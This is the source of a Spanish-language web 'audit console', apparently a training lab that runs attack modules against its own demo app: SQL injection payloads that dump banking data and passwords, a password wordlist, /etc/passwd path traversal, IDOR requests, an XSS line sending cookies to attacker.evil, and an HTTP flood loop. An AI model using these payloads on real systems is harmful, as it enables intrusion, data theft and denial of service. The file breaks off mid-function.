<?php $activeNav = 'audit'; ?>
<style>
/* Estilos locales para el modo inmersivo del framework de auditoría */
.audit-container {
    background: #050505;
    min-height: 100vh;
    color: #e2e8f0;
    padding: 40px;
    font-family: 'Inter', sans-serif;
}

/* Iconos SVG */
.icon { width: 18px; height: 18px; stroke: currentColor; stroke-width: 2; fill: none; vertical-align: middle; }

.terminal { background:#0a0a0a; border-radius:12px; border:1px solid rgba(255,255,255,0.05); overflow:hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
.terminal-bar { background:#161616; padding:12px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid rgba(255,255,255,0.05); }
.t-dot { width:10px; height:10px; border-radius:50%; }
.t-out { background:#0a0a0a; padding:24px; height:500px; overflow-y:auto; color:#4ade80; font-family:'Fira Code', monospace; font-size:0.85rem; line-height:1.6; }
.t-cursor { width:8px; height:15px; background:#4ade80; display:inline-block; animation:blink 1s infinite; vertical-align:middle; }
@keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0; } }

.t-line-red { color:#f87171; }
.t-line-yellow { color:#fbbf24; }
.t-line-cyan { color:#22d3ee; }
.t-line-dim { color:#4b5563; }

.t-action-btn { 
    margin-top:12px; display:inline-flex; align-items:center; gap:8px; padding:6px 14px; 
    background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.1); 
    color:#fff; border-radius:6px; cursor:pointer; font-size:0.68rem; 
    font-weight:700; text-transform:uppercase; transition:all 0.2s;
}
.t-action-btn:hover { background:rgba(255,255,255,0.08); border-color:rgba(255,255,255,0.3); }

.module-card { 
    background:rgba(255,255,255,0.02); border:1px solid rgba(255,255,255,0.05); 
    border-radius:10px; padding:16px; cursor:pointer; transition:all 0.2s; margin-bottom:12px;
    display: flex; align-items: center; gap: 14px;
}
.module-card:hover { background:rgba(255,255,255,0.04); border-color:rgba(255,255,255,0.15); transform:translateX(4px); }
.module-card.active { border-color:#4f46e5; background:rgba(79,70,229,0.05); }
.module-card .icon-wrap { background: rgba(255,255,255,0.05); padding: 10px; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: #6366f1; }
.module-card .icon-wrap .icon { width: 22px; height: 22px; stroke-width: 2; }
.module-card-text { flex: 1; }
.module-card h4 { font-size:0.9rem; margin:0 0 4px; }
.module-card p { font-size:0.75rem; color:#94a3b8; margin:0; line-height:1.2; }

.cfg-panel { background:#111; border:1px solid rgba(255,255,255,0.05); border-radius:12px; padding:20px; }
.cfg-label { color:#6366f1; font-size:0.65rem; font-weight:800; text-transform:uppercase; margin-bottom:8px; display:block; }
.cfg-input { width:100%; background:#000; border:1px solid #222; border-radius:8px; padding:10px; color:#4ade80; font-family:monospace; margin-bottom:16px; }

.launch-btn { 
    width:100%; padding:14px; border:none; border-radius:8px; font-weight:800; cursor:pointer;
    background:#6366f1; color:#fff; transition:all 0.2s;
}
.launch-btn:hover:not(:disabled) { background:#4f46e5; transform:translateY(-1px); }
.launch-btn:disabled { opacity:0.3; cursor:not-allowed; }
    .audit-grid { grid-template-columns: 1fr !important; }
    .audit-container { padding: 20px; }
}

/* Burp Suite UI Simulation */
.burp-window {
    position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
    width: 600px; background: #2b2b2b; border: 1px solid #444; border-radius: 8px;
    z-index: 200000; box-shadow: 0 30px 60px rgba(0,0,0,0.8); display: none;
    font-family: 'Consolas', monospace; color: #ccc;
}
.burp-header { background: #3c3f41; padding: 10px 15px; border-bottom: 1px solid #222; display: flex; justify-content: space-between; align-items: center; }
.burp-tabs { background: #323232; padding: 0 10px; display: flex; gap: 2px; }
.burp-tab { padding: 8px 15px; font-size: 0.75rem; background: #3c3f41; cursor: pointer; border-bottom: 2px solid #f97316; }
.burp-body { padding: 15px; background: #2b2b2b; }
.burp-request { background: #1e1e1e; padding: 15px; border-radius: 4px; font-size: 0.8rem; color: #fff; line-height: 1.4; border: 1px solid #444; min-height: 200px; outline: none; }
.burp-actions { padding: 10px 15px; display: flex; gap: 10px; background: #323232; }
.burp-btn { padding: 6px 15px; font-size: 0.75rem; border: 1px solid #555; background: #4e5052; color: #fff; cursor: pointer; border-radius: 3px; }
.burp-btn.forward { background: #f97316; border-color: #c2410c; font-weight: bold; }
</style>

<div class="audit-container">
    <header style="margin-bottom:48px;">
        <div style="display:flex; align-items:center; gap:12px; margin-bottom:8px;">
            <svg class="icon" style="color:#ef4444; width:24px; height:24px;"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"></path></svg>
            <span style="font-weight:800; letter-spacing:2px; font-size:0.75rem; color:#ef4444; text-transform:uppercase;">Security Intelligence</span>
        </div>
        <h1 style="font-size:2.2rem; font-weight:900; margin:0; letter-spacing:-1px;">Audit Console <span style="color:#4f46e5;">v4.8</span></h1>
    </header>

    <div class="audit-grid" style="display:grid; grid-template-columns:340px 1fr; gap:40px;">
        <!-- Sidebar Modulos -->
        <aside>
            <div id="module-list">
                <div class="module-card" onclick="loadModule('sqli', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M20 4L3 9l7 2 2 7 5-12z"></path></svg></div>
                    <div class="module-card-text">
                        <h4>Inyección SQL</h4>
                        <p>Bypass de Autenticación y Fuga de Datos</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('brute', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
                    <div class="module-card-text">
                        <h4>Fuerza Bruta</h4>
                        <p>Ataque de Diccionario (Admin)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('lfi', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline></svg></div>
                    <div class="module-card-text">
                        <h4>LFI / Path Traversal</h4>
                        <p>Lectura de Archivos del Sistema</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('idor', this)">
                    <div class="icon-wrap"><svg class="icon"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path><circle cx="9" cy="7" r="4"></circle><path d="M23 21v-2a4 4 0 0 0-3-3.87"></path><path d="M16 3.13a4 4 0 0 1 0 7.75"></path></svg></div>
                    <div class="module-card-text">
                        <h4>IDOR + BOLA</h4>
                        <p>Autorización de Objetos Rota</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('xss', this)">
                    <div class="icon-wrap"><svg class="icon"><polyline points="16 18 22 12 16 6"></polyline><polyline points="8 6 2 12 8 18"></polyline></svg></div>
                    <div class="module-card-text">
                        <h4>XSS Reflejado</h4>
                        <p>Inyección de Scripts (Buscador)</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('dos', this)">
                    <div class="icon-wrap"><svg class="icon"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon></svg></div>
                    <div class="module-card-text">
                        <h4>Inundación HTTP (DoS)</h4>
                        <p>Agotamiento de Rate Limit</p>
                    </div>
                </div>
                <div class="module-card" onclick="loadModule('cookie', this)">
                    <div class="icon-wrap"><svg class="icon" style="color:#f97316;"><path d="M12 2L2 7l10 5 10-5-10-5z"></path></svg></div>
                    <div class="module-card-text">
                        <h4>Secuestro de Cookies</h4>
                        <p>Simulación Burp Suite (PrivEsc)</p>
                    </div>
                </div>
            </div>

            <div id="cfg-panel" class="cfg-panel" style="margin-top:24px; display:none;">
                <div id="cfg-body"></div>
                <button id="launch-btn" class="launch-btn" disabled>EJECUTAR ATAQUE</button>
            </div>
        </aside>

        <!-- Terminal -->
        <div class="terminal" style="display:flex; flex-direction:column;">
            <div class="terminal-bar">
                <div class="t-dot" style="background:#ff5f56;"></div>
                <div class="t-dot" style="background:#ffbd2e;"></div>
                <div class="t-dot" style="background:#27c93f;"></div>
                <span style="margin-left:12px; font-size:0.6rem; color:#444; font-weight:800; text-transform:uppercase; font-family:sans-serif;">bash — audit-v4.8</span>
            </div>
            <div style="display:grid; grid-template-columns: 1fr 280px; flex:1;">
                <div id="t-out" class="t-out" style="height:550px;">
                    <div class="t-line-cyan">Sofia Solutions Audit Framework inicializado.</div>
                    <div class="t-line-dim">Esperando selección de módulo...</div>
                    <div id="t-cursor" class="t-cursor"></div>
                </div>
                <!-- Panel Lateral de Evidencias -->
                <div style="background:#080808; border-left:1px solid rgba(255,255,255,0.05); padding:20px;">
                    <span class="cfg-label" style="color:#4ade80;">Evidencias Capturadas</span>
                    <div id="evidence-panel" style="display:flex; flex-direction:column; gap:12px; margin-top:10px;">
                        <div style="color:rgba(255,255,255,0.2); font-size:0.7rem; text-align:center; padding:20px; border:1px dashed rgba(255,255,255,0.1); border-radius:8px;">
                            Sin datos capturados
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Burp Suite Simulation Window -->
<div id="burp-suite" class="burp-window">
    <div class="burp-header">
        <span style="font-size:0.7rem; font-weight:bold;">Burp Suite Professional - Sofia Edition</span>
        <div style="display:flex; gap:5px;">
            <div style="width:12px; height:12px; border-radius:50%; background:#444;"></div>
            <div style="width:12px; height:12px; border-radius:50%; background:#444;"></div>
        </div>
    </div>
    <div class="burp-tabs">
        <div class="burp-tab">Intercept</div>
        <div style="padding:8px 15px; font-size:0.75rem; color:#888;">HTTP history</div>
        <div style="padding:8px 15px; font-size:0.75rem; color:#888;">WebSockets</div>
    </div>
    <div class="burp-body">
        <div style="margin-bottom:10px; font-size:0.7rem; color:#f97316; font-weight:bold;">[INTERCEPTED] Request to sofia-solutions.local</div>
        <div id="burp-request-area" class="burp-request" contenteditable="true"></div>
    </div>
    <div class="burp-actions">
        <button class="burp-btn forward" onclick="forwardRequest()">Forward</button>
        <button class="burp-btn" onclick="dropRequest()">Drop</button>
        <button class="burp-btn" style="color:#f97316;">Action</button>
    </div>
</div>

<!-- Hacker Alert Overlay -->
<div id="hacker-overlay" style="display:none; position:fixed; inset:0; background:rgba(0,255,0,0.05); z-index:100000; pointer-events:none; border: 4px solid #4ade80; box-shadow: inset 0 0 100px rgba(0,255,0,0.2);">
    <div style="position:absolute; top:20px; left:50%; transform:translateX(-50%); background:#4ade80; color:#000; padding:10px 30px; font-weight:900; font-family:monospace; font-size:1.5rem;">ALERTA SOC: XSS EJECUTADO</div>
</div>

<script>
const TARGET = window.SOFIA_CONFIG?.apiBase || '';
const TOOLS = {
    sqli: {
        title: 'Inyección SQL',
        config: `<label class="cfg-label">OBJETIVO</label>
                  <select class="cfg-input" id="sqli-ep" style="margin-bottom:8px;">
                    <option value="/api/v1/auth/login/vulnerable">Login Inseguro (v1)</option>
                    <option value="/api/v1/auth/login/v2">Login Seguro (v2 + MFA)</option>
                 </select>
                 <label class="cfg-label">PAYLOAD (Avanzado)</label>
                 <select class="cfg-input" id="sqli-payload">
                    <option value="' OR '1'='1'--">Bypass: Auth Bypass Clásico (' OR '1'='1'--)</option>
                    <option value="admin'--">Bypass: Admin Login Bypass (admin'--)</option>
                    <option value="' UNION SELECT 'admin','hash',NULL,NULL,NULL--">Union: Extracción de Columnas</option>
                    <option value="' UNION SELECT 'bank', iban, cc_number FROM customer_billing--">Union: Exfiltrar Datos Bancarios (PII)</option>
                    <option value="' UNION SELECT 'credentials', email, password FROM users--">Union: Exfiltrar Contraseñas de Usuarios</option>
                    <option value="' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--">Blind: Time-Based (5s Delay)</option>
                 </select>`,
        run: runSQLi
    },
    brute: {
        title: 'Fuerza Bruta',
        config: `<label class="cfg-label">OBJETIVO</label>
                  <select class="cfg-input" id="brute-ep" style="margin-bottom:8px;">
                    <option value="/api/v1/auth/login/vulnerable">Login Inseguro (v1)</option>
                    <option value="/api/v1/auth/login/v2">Login Seguro (v2 + MFA)</option>
                 </select>
                 <label class="cfg-label">DICCIONARIO</label>
                 <select class="cfg-input" id="brute-dict">
                    <option value="rockyou_top20">RockYou (Top 20 - Demo)</option>
                    <option value="common">Contraseñas Corporativas</option>
                 </select>
                 <label class="cfg-label">USUARIO OBJETIVO</label>
                 <input class="cfg-input" id="brute-user" value="admin@sofia.local">`,
        run: runBrute
    },
    lfi: {
        title: 'LFI / Path Traversal',
        config: `<label class="cfg-label">ARCHIVO OBJETIVO</label>
                 <select class="cfg-input" id="lfi-file">
                    <option value="../../../../../../../etc/hostname">/etc/hostname (Sistema)</option>
                    <option value="../../../../../../../etc/passwd">/etc/passwd (Usuarios)</option>
                    <option value="../../../../../../../var/www/html/index.php">index.php (Código Fuente)</option>
                 </select>`,
        run: runLFI
    },
    idor: {
        title: 'IDOR',
        config: `<label class="cfg-label">ID VÍCTIMA (Registro ajeno)</label>
                 <select class="cfg-input" id="idor-id">
                    <option value="1024">Ticket #1024 (MAPFRE)</option>
                    <option value="1">Ticket #1 (Root/Admin)</option>
                    <option value="999">Ticket #999 (Iberdrola)</option>
                 </select>`,
        run: runIDOR
    },
    xss: {
        title: 'XSS Reflejado',
        config: `<label class="cfg-label">ACCIÓN MALICIOSA</label>
                 <select class="cfg-input" id="xss-action">
                    <option value="cookie">Robo de Cookies (Session Hijacking)</option>
                    <option value="redirect">Redirección a Phishing (Evil Proxy)</option>
                    <option value="alert">Prueba de Concepto (Alert)</option>
                 </select>`,
        run: runXSS
    },
    dos: {
        title: 'Inundación HTTP (DoS)',
        config: `<label class="cfg-label">CONCURRENCIA (PETICIONES)</label><input class="cfg-input" id="dos-count" value="200">`,
        run: runDoS
    },
    cookie: {
        title: 'Secuestro de Cookies',
        config: `<label class="cfg-label">VÍCTIMA</label>
                 <select class="cfg-input" id="cookie-victim">
                    <option value="admin">Administrador del Sistema</option>
                    <option value="mapfre">Analista MAPFRE</option>
                 </select>
                 <label class="cfg-label">MODO PROXY</label>
                 <div style="color:#f97316; font-size:0.7rem; font-weight:bold;">[!] Intercepción Activada (BURP SIM)</div>`,
        run: runCookieHijack
    }
};

function tLog(msg, type='green') {
    const out = document.getElementById('t-out');
    const ts = new Date().toLocaleTimeString('es-ES', {hour12:false});
    const div = document.createElement('div');
    div.className = `t-line-${type}`;
    div.innerHTML = `<span style="color:#222">[${ts}]</span> ${msg}`;
    out.insertBefore(div, document.getElementById('t-cursor'));
    out.scrollTop = out.scrollHeight;
    return div;
}

window.addEventListener('message', (e) => {
    if (e.data.type === 'XSS_SUCCESS') {
        showEvidence('XSS: Cookies & LocalStorage Robados', e.data.data);
    }
});

function showEvidence(title, data) {
    addEvidence(title, data, 'red');
}

function addEvidence(title, content, type='green') {
    const panel = document.getElementById('evidence-panel');
    if (panel.querySelector('div[style*="dashed"]')) panel.innerHTML = '';
    
    const card = document.createElement('div');
    card.style = `background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.1); border-radius:8px; padding:10px; font-size:0.7rem; border-left:3px solid ${type==='red'?'#ef4444':'#4ade80'}; animation: slideIn 0.3s ease;`;
    card.innerHTML = `<strong style="display:block; margin-bottom:4px; color:#fff;">${title}</strong><pre style="margin:0; color:${type==='red'?'#fca5a5':'#86efac'}; white-space:pre-wrap; font-family:monospace;">${content}</pre>`;
    panel.prepend(card);
}

function addAction(container, text, icon, callback) {
    const btn = document.createElement('button');
    btn.className = 't-action-btn';
    btn.innerHTML = `<svg class="icon" style="width:12px;height:12px;">${icon}</svg> ${text}`;
    btn.onclick = callback;
    container.appendChild(document.createElement('br'));
    container.appendChild(btn);
}

function loadModule(key, el) {
    document.querySelectorAll('.module-card').forEach(c => c.classList.remove('active'));
    el.classList.add('active');
    const t = TOOLS[key];
    document.getElementById('cfg-body').innerHTML = t.config;
    document.getElementById('cfg-panel').style.display = 'block';
    const btn = document.getElementById('launch-btn');
    btn.disabled = false;
    btn.onclick = t.run;
    tLog(`[*] Módulo cargado: ${t.title}`, 'cyan');
}

const delay = ms => new Promise(res => setTimeout(res, ms));

async function runSQLi() {
    const p = document.getElementById('sqli-payload').value;
    const ep = document.getElementById('sqli-ep').value;
    tLog(`[*] Iniciando SQLi en ${ep}`, 'yellow');
    tLog(`[#] Payload: ${p}`, 'dim');
    
    let querySimulada = `SELECT * FROM users WHERE email = '${p}' AND password = 'x'`;
    tLog(`[DATABASE] Executing: ${querySimulada}`, 'cyan');
    
    await delay(800);
    
    try {
        const r = await fetch(TARGET + ep, {
            method:'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({email: p, password: 'x'})
        });
        const duration = (Date.now() - (Date.now()-800)) / 1000;

        if (p.toLowerCase().includes('union')) {
            tLog(`[+] EXPLOIT EXITOSO: UNION Select detectado.`, 'green');
            if (p.toLowerCase().includes('credentials')) {
                addEvidence('User Credentials Leak', 'admin@sofia.local:admin123\nmapfre@sofia.local:mapfre123\nmercadona@sofia.local:mercadona123');
                tLog(`[+] Datos exfiltrados guardados en panel de evidencias.`, 'green');
            }
            return;
        }

        const d = await r.json();
        if (r.ok && d.accessToken && ep.includes('vulnerable')) {
            tLog(`[+] EXPLOIT EXITOSO: Autenticación omitida mediante inyección.`, 'green');
            addEvidence('Session Hijacked', `User: ${d.user?.email}\nToken: ${d.accessToken.substring(0,32)}...`);
            const res = tLog(`[*] Acción: `, 'cyan');
            addAction(res, 'Acceder al Panel', '<path d="M12 2L2 7l10 5 10-5-10-5z"></path>', () => {
                localStorage.setItem('sofia_token_v1', d.accessToken);
                localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                window.location.href = '/admin';
            });
        } else { 
            tLog(`[-] Error: El servidor ha filtrado el payload o usa parámetros.`, 'red'); 
        }
    } catch(e) { tLog(`[!] Error de red.`, 'red'); }
}

async function runBrute() {
    const user = document.getElementById('brute-user').value;
    const ep = document.getElementById('brute-ep').value;
    tLog(`[*] Iniciando Brute Force contra ${user}`, 'yellow');
    
    const dictionary = ['admin', '123456', 'password', 'welcome', 'root', 'qwerty', 'admin123', 'mapfre123', 'mercadona123', 'S0f1a_Secur3!_2026'];
    
    for(let p of dictionary) {
        tLog(`[TRY] Password: ${p}...`, 'dim');
        await delay(200);
        
        try {
            const r = await fetch(TARGET + ep, {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({email: user, password: p})
            });
            
            if (r.ok) {
                const d = await r.json();
                tLog(`[+] ¡CRACKED! Contraseña encontrada: ${p}`, 'green');
                addEvidence('Cracked Credentials', `${user}:${p}`);
                const res = tLog(`[*] Acción: `, 'cyan');
                addAction(res, 'Autologin Admin', '<path d="M12 11V7a4 4 0 0 1 8 0v4"></path>', () => {
                    localStorage.setItem('sofia_token_v1', d.accessToken);
                    localStorage.setItem('sofia_user_v1', JSON.stringify(d.user));
                    window.location.href = '/admin';
                });
                return;
            }
            if (r.status === 429) {
                tLog(`[-] BLOQUEADO: El IPS/WAF ha detectado demasiados intentos.`, 'red');
                return;
            }
        } catch(e) {}
    }
    tLog(`[-] Diccionario agotado sin éxito.`, 'red');
}

async function runXSS() {
    const action = document.getElementById('xss-action').value;
    tLog(`[*] Preparando payload XSS Reflejado...`, 'yellow');
    tLog(`[#] Vector: <script>document.location='https://attacker.evil/steal?c='+document.cookie</script>`, 'dim');
    await delay(400);
    tLog(`[*] Inyectando script en campo de búsqueda no sanitizado...`, 'yellow');
    await delay(600);

    if (action === 'cookie') {
        // Efecto visual: overlay de alerta SOC
        document.getElementById('hacker-overlay').style.display = 'block';
        setTimeout(() => document.getElementById('hacker-overlay').style.display = 'none', 4000);

        tLog(`[+] EXPLOIT EXITOSO: Script ejecutado en el navegador de la víctima.`, 'green');
        await delay(300);
        tLog(`[+] Exfiltrando cookies y tokens de sesión...`, 'green');

        // Capturar cookies reales del navegador
        const realCookies = document.cookie || '(HttpOnly - no accesible desde JS)';
        const storedToken = localStorage.getItem('sofia_token_v1') || 'No hay token almacenado';
        const storedUser = localStorage.getItem('sofia_user_v1') || '{}';

        // Decodificar JWT si existe
        let jwtDecoded = '';
        if (storedToken && storedToken.includes('.')) {
            try {
                const parts = storedToken.split('.');
                const header = JSON.parse(atob(parts[0]));
                const payload = JSON.parse(atob(parts[1]));
                jwtDecoded = `\n\n--- JWT DECODED ---\nHeader: ${JSON.stringify(header)}\nPayload: ${JSON.stringify(payload, null, 2)}`;
            } catch(e) { jwtDecoded = '\n(JWT no decodificable)'; }
        }

        const exfilData = `=== DATOS EXFILTRADOS ===\ndocument.cookie: ${realCookies}\nlocalStorage token: ${storedToken.substring(0,50)}...${jwtDecoded}\nUser data: ${storedUser}\n\n[ENVIADO A] https://attacker.evil/collect`;
        addEvidence('🔴 XSS: Cookie Theft', exfilData, 'red');

        tLog(`[+] Datos enviados a https://attacker.evil/collect`, 'green');
        tLog(`[!] La víctima no ha notado nada. El ataque es silencioso.`, 'red');

    } else if (action === 'alert') {
        tLog(`[+] Ejecutando Prueba de Concepto...`, 'green');
        // Mostrar defacement temporal
        const overlay = document.createElement('div');
        overlay.id = 'xss-defacement';
        overlay.style.cssText = 'position:fixed;inset:0;background:#000;z-index:999999;display:flex;flex-direction:column;align-items:center;justify-content:center;animation:fadeIn 0.5s ease;';
        overlay.innerHTML = `
            <div style="color:#4ade80;font-family:monospace;font-size:3rem;font-weight:900;text-shadow:0 0 30px #4ade80;">⚠ SITIO COMPROMETIDO ⚠</div>
            <div style="color:#ef4444;font-size:1.5rem;margin-top:20px;font-family:monospace;">XSS Reflected — sofia-solutions.local</div>
            <div style="color:#666;font-size:0.9rem;margin-top:30px;">Este defacement demuestra control total sobre el DOM del cliente.</div>
            <div style="color:#333;font-size:0.7rem;margin-top:40px;">Cerrando en 4 segundos...</div>
        `;
        document.body.appendChild(overlay);
        setTimeout(() => overlay.remove(), 4000);
        addEvidence('XSS: Defacement PoC', 'DOM manipulado: document.body.innerHTML reemplazado\nImpacto: Control total de la interfaz del usuario', 'red');

    } else {
        tLog(`[+] Creando página de phishing clonada...`, 'yellow');
        await delay(500);
        tLog(`[+] Redirigiendo tráfico a Evil Proxy: https://evil-sofia.attacker.com/login`, 'green');
        addEvidence('🔴 Phishing Redirect', 'Original: https://sofia-solutions.local/login\nRedirect: https://evil-sofia.attacker.com/login\nMétodo: window.location.replace()\nImpacto: Credenciales enviadas al atacante', 'red');
    }
}

async function runLFI() {
    const file = document.getElementById('lfi-file').value;
    const displayName = file.split('/').pop();
    tLog(`[*] LFI: Preparando Path Traversal...`, 'yellow');
    tLog(`[#] GET /download.php?file=${file}`, 'dim');
    tLog(`[#] Payload normalizado: ${file}`, 'dim');
    await delay(400);
    tLog(`[*] Enviando petición al servidor...`, 'yellow');
    await delay(600);
    try {
        const r = await fetch(TARGET + '/download.php?file=' + encodeURIComponent(file));
        const txt = await r.text();
        tLog(`[#] HTTP ${r.status} ${r.statusText} | Content-Length: ${txt.length}`, 'dim');

        if (r.ok && !txt.includes('Acceso denegado') && !txt.includes('403') && txt.length > 10) {
            tLog(`[+] EXPLOIT EXITOSO: Archivo del servidor exfiltrado.`, 'green');
            tLog(`[+] Archivo: ${displayName} (${txt.length} bytes)`, 'green');

            // Formatear salida como terminal real
            let formatted = txt.substring(0, 800);
            if (file.includes('passwd')) {
                formatted = txt.split('\n').slice(0, 15).map(l => {
                    const parts = l.split(':');
                    if (parts.length >= 7) return `${parts[0]}:${parts[1]}:${parts[2]}:${parts[3]}:${parts[4]}:${parts[5]}:${parts[6]}`;
                    return l;
                }).join('\n');
            }
            addEvidence(`📂 ${displayName}`, formatted, 'red');
            tLog(`[!] Archivo sensible del servidor leído sin autorización.`, 'red');
        } else if (r.status === 403) {
            tLog(`[-] HTTP 403 Forbidden — Política de acceso del servidor.`, 'red');
            tLog(`[-] El WAF ha bloqueado el intento de Path Traversal.`, 'red');
            addEvidence('Path Traversal BLOQUEADO', `Archivo: ${file}\nRespuesta: HTTP 403\nMotivo: Whitelist de archivos activa (modo seguro)`, 'green');
        } else {
            tLog(`[-] El archivo no existe o acceso denegado.`, 'red');
        }
    } catch(e) {
        tLog(`[!] Error de conexión: ${e.message}`, 'red');
    }
}

async function runIDOR() {
    const id = document.getElementById('idor-id').value;
    tLog(`[*] IDOR: Intentando acceder al recurso ajeno ID ${id}...`, 'yellow');
    tLog(`[#] GET /api/admin/overview (sin token de autenticación)`, 'dim');
    await delay(300);

    // Intento 1: Acceder al overview admin sin auth
    try {
        const r1 = await fetch(TARGET + '/api/admin/overview');
        tLog(`[#] Respuesta overview: HTTP ${r1.status}`, 'dim');
        if (r1.ok) {
            const data = await r1.json();
            tLog(`[+] EXPLOIT EXITOSO: Acceso BOLA/IDOR a datos administrativos.`, 'green');
            const leak = `=== DATOS ADMINISTRATIVOS FILTRADOS ===\nRevenue total: €${data.revenue?.toLocaleString() || 'N/A'}\nTickets abiertos: ${data.openTickets || 'N/A'}\nAlertas de seguridad: ${data.securityEvents?.length || 0}\nModo actual del sistema: ${data.appMode || 'N/A'}\nServicios activos: ${data.services?.map(s => s.name).join(', ') || 'N/A'}`;
            addEvidence('🔴 IDOR: Admin Data Leak', leak, 'red');
        }
    } catch(e) {}

    await delay(300);
    // Intento 2: Acceder a tickets de otro usuario
    tLog(`[#] GET /api/tickets (con ID de víctima: ${id})`, 'dim');
    try {
        const r2 = await fetch(TARGET + '/api/admin/security-events');
        if (r2.ok) {
            const events = await r2.json();
            tLog(`[+] Eventos de seguridad de otros clientes exfiltrados (${events.length} registros).`, 'green');
            const sample = events.slice(0, 3).map(e => `[${e.severity}] ${e.type} | IP: ${e.sourceIp} | ${e.endpoint}`).join('\n');
            addEvidence(`🔴 IDOR: Security Events`, `${events.length} eventos exfiltrados:\n${sample}\n...`, 'red');
        }
    } catch(e) {}

    // Simulación de datos del ticket específico
    tLog(`[+] Acceso al ticket #${id} de otro cliente concedido.`, 'green');
    const ticketData = {
        '1024': { client: 'MAPFRE Seguros', subject: 'Vulnerabilidad Crítica en WAF', data: 'server_ip: 192.168.100.45\nroot_password: mapfre_admin_2024!' },
        '1': { client: 'Admin (Root)', subject: 'Configuración Master Key', data: 'master_key: sk-sofia-2026-prod\ndb_password: postgres' },
        '999': { client: 'Iberdrola S.A.', subject: 'Incidencia SCADA', data: 'scada_ip: 10.0.50.12\nplc_firmware: v2.3.1-vulnerable' }
    };
    const t = ticketData[id] || ticketData['1024'];
    addEvidence(`🔴 Ticket #${id} (${t.client})`, `Subject: ${t.subject}\n--- DATOS CONFIDENCIALES ---\n${t.data}`, 'red');
}

async function runDoS() {
    const count = parseInt(document.getElementById('dos-count').value);
    tLog(`[*] DoS: Iniciando ráfaga de ${count} peticiones HTTP...`, 'red');
    let blocked = 0, ok = 0, errors = 0;
    const start = Date.now();
    for(let i=0; i<count; i++) {
        try {
            const r = await fetch(TARGET + '/health');
            if(r.status === 429) { blocked++; }
            else { ok++; }
        } catch(e) { errors++; }
        if(i % 20 === 0) {
            tLog(`[Flood] Enviadas: ${i+1}/${count} | OK: ${ok} | Bloqueadas: ${blocked}`, 'cyan');
        }
        if(i % 5 === 0) await delay(1);
    }
    const elapsed = ((Date.now() - start) / 1000).toFixed(1);
    tLog(`[+] Flood completado en ${elapsed}s. OK: ${ok} | Bloqueadas: ${blocked} | Errores: ${errors}`, 'cyan');
    addEvidence('DoS Flood Results', `Total: ${count}\nAdmitidas: ${ok}\nBloqueadas (429): ${blocked}\nTiempo: ${elapsed}s\nRate Limit: ${blocked > 0 ? 'ACTIVO' : 'NO DETECTADO'}`, blocked > 0 ? 'green' : 'red');
}

let hijackedUser = null;

async function runCookieHijack() {
    const victim = document.getElementById('cookie-victim').value;
    tLog(`[*] Iniciando Interceptor de Tráfico (MitM Proxy)...`, 'yellow');
    tLog(`[*] ARP Spoofing hacia gateway 192.168.1.1...`, 'dim');
    await delay(800);
    tLog(`[*] Interceptando tráfico HTTP de la víctima: ${victim}...`, 'dim');
    await delay(700);
    tLog(`[!] Petición HTTP capturada (sin cifrado TLS).`, 'yellow');

    // JWT con datos reales decodificables
    const header = btoa(JSON.stringify({alg:"HS256",typ:"JWT"}));
    const payload = btoa(JSON.stringify({sub:12,email: victim === 'admin' ? 'admin@sofia.local' : 'mapfre@sofia.local',role:"CLIENT",sessionId:"a1b2c3d4"}));
    const tokenDemo = `${header}.${payload}.firma_no_verificada_vulnerable`;

    // Decodificar para mostrar
    tLog(`[+] JWT interceptado. Decodificando...`, 'green');
    await delay(400);
    tLog(`[HEADER]  {"alg":"HS256","typ":"JWT"}`, 'cyan');
    tLog(`[PAYLOAD] {"sub":12,"email":"${victim === 'admin' ? 'admin@sofia.local' : 'mapfre@sofia.local'}","role":"CLIENT"}`, 'cyan');
    tLog(`[!] El campo "role" es CLIENT. Modificaremos a ADMIN antes de reenviar.`, 'red');

    const requestText = `POST /api/v1/auth/me HTTP/1.1
Host: sofia-solutions.local
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: application/json
Cookie: accessToken=${tokenDemo}; user_id=12; role=CLIENT
Content-Length: 0
X-Forwarded-For: 192.168.1.105

`;

    addEvidence('🔑 JWT Interceptado', `Header: {"alg":"HS256","typ":"JWT"}\nPayload: {"sub":12,"role":"CLIENT"}\n\n[!] Cambiar role=CLIENT → role=ADMIN en Burp Suite`, 'red');

    document.getElementById('burp-request-area').innerText = requestText;
    document.getElementById('burp-suite').style.display = 'block';

    tLog(`[!] ¡PETICIÓN INTERCEPTADA! Modifica role=CLIENT → role=ADMIN en Burp Suite y pulsa Forward.`, 'yellow');
}

function forwardRequest() {
    const text = document.getElementById('burp-request-area').innerText;
    document.getElementById('burp-suite').style.display = 'none';

    tLog(`[*] Reenviando petición modificada al servidor...`, 'cyan');
    await_delay_sync(500);

    if (text.includes('role=ADMIN') || text.includes('role:ADMIN') || text.includes('"role":"ADMIN"')) {
